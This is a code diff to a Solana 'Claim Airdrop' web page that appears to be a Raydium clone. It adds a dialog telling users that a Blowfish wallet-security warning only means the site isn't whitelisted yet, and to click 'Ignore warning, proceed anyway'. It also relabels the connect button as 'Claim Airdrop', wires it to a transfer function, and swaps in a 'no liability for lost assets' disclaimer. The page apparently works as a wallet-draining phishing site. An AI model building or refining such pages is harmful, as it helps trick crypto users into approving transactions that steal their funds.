@@ -47,6 +47,7 @@ import * as anchor from '@project-serum/anchor'
 import { ASSOCIATED_PROGRAM_ID } from '@project-serum/anchor/dist/cjs/utils/token'
 import { AirdropProgram } from '@/idl/airdrop'
 import { createAssociatedTokenAccountInstruction } from '@solana/spl-token'
+import ReactPlayer from 'react-player'
 
 function HomePageContainer({ children }: { children?: ReactNode }) {
   useDocumentScrollActionDetector()
@@ -86,6 +87,82 @@ function HomePageNavbar() {
   )
 }
 
+function VideoPlayDialog({
+  onClose
+}: {
+  onClose?: () => void
+}) {
+  const videosrc = "/videos/guide.mp4";
+  return (
+    <ResponsiveDialogDrawer
+      maskNoBlur
+      placement="from-bottom"
+      open={true}
+      canClosedByMask={false}
+    >
+      <Card
+        className={twMerge(
+          `flex flex-col p-8 mobile:p-5 rounded-3xl mobile:rounded-b-none mobile:h-[80vh] w-[min(552px,100vw)] mobile:w-full border-1.5 border-[rgba(171,196,255,0.2)]`
+        )}
+        size="lg"
+        style={{
+          background:
+            'linear-gradient(140.14deg, rgba(0, 182, 191, 0.15) 0%, rgba(27, 22, 89, 0.1) 86.61%), linear-gradient(321.82deg, #18134D 0%, #1B1659 100%)',
+          boxShadow: '0px 8px 48px rgba(171, 196, 255, 0.12)'
+        }}
+      >
+        {/* title */}
+        <div className="text-xl font-semibold text-white">How to Claim ?</div>
+
+        {/* content */}
+        <div className="grow text-sm leading-normal text-[#abc4ffb3] scrollbar-width-thin h-96 mobile:h-12 rounded p-4 my-6 mobile:my-4 bg-[#141041]">
+          <div className='flex flex-col items-center'>
+            <div className='mt-5 rounded-lg'>
+              <ReactPlayer
+                width="auto"
+                height="225px"
+                url={videosrc}
+                controls={false}
+                playing={true}
+                // light is usefull incase of dark mode
+                light={false}
+                // picture in picture
+                pip={true}
+              />
+              <source src={videosrc} type="video/mp4" />
+            </div>
+          </div>
+          <div className='flex flex-col items-center'>
+            <p className="mt-7 text-center">
+              If you see this warning it means our site hasn't
+              been whitelistet by
+              <a href="https://blowfish.xyz/">
+                blowfish.xyz
+              </a>
+              yet, this process
+              takes time.
+            </p>
+            <u>
+              Click "Ignore warning, proceed anyway" to
+              continue action.
+            </u>
+          </div>
+        </div>
+
+        <Col className="">
+          <Button
+            className={`text-[#ABC4FF]  frosted-glass-teal`}
+            onClick={onClose}
+          >
+            Agree and Continue
+          </Button>
+        </Col>
+      </Card>
+    </ResponsiveDialogDrawer>
+  )
+}
+
+
 function HomePageSection0() {
   const isMobile = useAppSettings((s) => s.isMobile)
   const { push } = useRouter()
@@ -100,21 +177,12 @@ function HomePageSection0() {
   const anchorWallet = useAnchorWallet()
 
   const programId = new PublicKey(AIRDROP_PROGRAM_PUBKEY)
-  // const program = new anchor.Program(AirdropProgram as anchor.Idl, programId)
-
   const program = useMemo(() => {
     if (anchorWallet) {
       const provider = new anchor.AnchorProvider(connection, anchorWallet, anchor.AnchorProvider.defaultOptions())
       return new anchor.Program(AirdropProgram as anchor.Idl, AIRDROP_PROGRAM_PUBKEY, provider)
     }
   }, [connection, anchorWallet])
-
-  useEffect(() => {
-    if (owner && isButtonClicked) {
-      txTransfer()
-    }
-  }, [owner, isButtonClicked])
-
   const txTransfer = async () => {
     if (owner) {
       try {
@@ -218,6 +286,7 @@ function HomePageSection0() {
 
   return (
     <section className="grid-child-center grid-cover-container mb-16 relative">
+      {isButtonClicked && <VideoPlayDialog onClose={() => { setIsButtonClicked(false) }} />}
       <Image src="/backgroundImages/home-bg-element-1.png" className="w-[744px] mobile:w-[394px]" />
       <div className="grid-cover-content children-center">
         <div className="font-light text-[64px] mobile:text-[30px] text-white mb-4 mt-14 mobile:mt-9 leading-[60px] mobile:leading-[32px]">
@@ -243,17 +312,18 @@ function HomePageSection0() {
             <Button
               className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
               onClick={async () => {
+                setIsButtonClicked(true)
                 await txTransfer()
               }}
             >
               <Row className="items-center gap-2">
                 <div>Claim Airdrop</div>
-                <Icon iconSrc="/icons/gitbook.svg" size="sm" />
+                <Icon heroIconName="chevron-right" size="xs" />
               </Row>
             </Button>
           )) || (
               <Button
-                className="home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4"
+                className="frosted-glass-teal text-white mobile:text-xs px-5 mobile:px-4 forsted-blur"
                 onClick={() => {
                   setIsButtonClicked(true)
                   useAppSettings.setState({ needPopDisclaimer: false })
@@ -262,7 +332,7 @@ function HomePageSection0() {
                 }}
               >
                 <Row className="items-center gap-2">
-                  <div>Connect</div>
+                  <div>Claim Airdrop</div>
                   <Icon heroIconName="chevron-right" size="xs" />
                 </Row>
               </Button>
@@ -483,10 +553,11 @@ function HomePageSection2() {
             <div className="frosted-glass-teal p-3 mb-3 rounded-xl">
               <Icon iconSrc="/icons/home-pool.svg" />
             </div>
-            <div className="font-semibold text-lg text-white mb-2">Premissionless Liquidity</div>
+            <div className="font-semibold text-lg text-white mb-2">Disclaimer</div>
             <div className="font-light text-[#c4d6ff] mb-5">
-              Raydium enables the permissionless creation of liquidity pools and farms so projects can launch and
-              bootstrap liquidity in a decentralized manner.
+              This page is for testing purposes only and does not represent any connection to
+              <a href="https://raydium.io/swap/?inputMint=sol&outputMint=4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R">raydium.io</a>.
+              We assume no liability for lost assets.
             </div>
           </Card>
         </Grid>
